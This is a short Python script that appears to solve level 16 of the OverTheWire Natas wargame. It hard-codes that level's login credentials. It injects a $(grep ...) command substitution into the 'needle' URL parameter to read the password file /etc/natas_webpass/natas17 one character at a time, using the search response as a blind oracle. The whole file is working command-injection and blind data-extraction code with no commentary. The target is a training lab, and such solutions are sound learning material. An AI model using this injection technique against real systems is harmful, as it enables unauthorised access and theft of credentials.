import requests

chars='0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
password=''

for n in range(len(password), 33):
  for char in chars:
    url="http://natas16.natas.labs.overthewire.org/index.php?needle=Christianities$(grep ^" + password + char + " /etc/natas_webpass/natas17)"
    response = requests.get(url, auth = ("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")).content.decode('utf-8')
    if "Christianities" not in response:
      password += char
      print(password)
      break